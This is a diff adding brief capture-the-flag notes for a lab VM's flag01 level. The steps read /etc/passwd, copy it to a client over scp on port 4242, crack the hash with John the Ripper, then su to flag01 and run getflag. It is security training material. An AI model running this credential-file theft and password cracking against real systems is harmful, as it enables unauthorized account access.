@@ -1,0 +1,9 @@
+# VM
+cat /etc/passwd | grep flag01
+# client
+scp -P 4242 level00@10.12.1.137:/etc/passwd .
+john passwd
+john --show passwd
+# VM
+su flag01
+getflag
